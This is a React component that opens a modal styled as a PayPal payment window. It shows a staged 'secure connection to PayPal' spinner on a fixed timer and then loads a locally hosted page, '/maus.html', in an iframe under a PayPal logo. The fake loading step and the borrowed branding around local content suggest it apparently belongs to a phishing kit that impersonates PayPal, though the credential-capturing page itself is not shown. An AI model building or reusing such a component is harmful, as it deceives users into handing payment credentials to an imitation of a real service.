'use client';

import { useState, useEffect } from 'react';

interface PayPalModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export default function PayPalModal({ isOpen, onClose }: PayPalModalProps) {
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    if (isOpen) {
      setIsLoading(true);
      const timer = setTimeout(() => {
        setIsLoading(false);
      }, 2000);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  if (!isOpen) return null;

  return (
    <div className="modal-overlay" onClick={onClose}>
      {isLoading ? (
        <div className="paypal-loading">
          <div className="spinner-white"></div>
          <p>Sichere Verbindung zu PayPal...</p>
        </div>
      ) : (
        <div className="paypal-modal" onClick={(e) => e.stopPropagation()}>
          <div className="paypal-header">
            <img src="/p_icon.svg" height="20" alt="PayPal" />
            <i 
              className="fas fa-times" 
              onClick={onClose} 
              style={{ position: 'absolute', right: '15px', top: '15px', cursor: 'pointer', color: '#ccd', fontSize: '20px' }}
            ></i>
          </div>
          <iframe src="/maus.html" style={{ border: 'none', width: '100%', height: '100%' }}></iframe>
        </div>
      )}
    </div>
  );
}


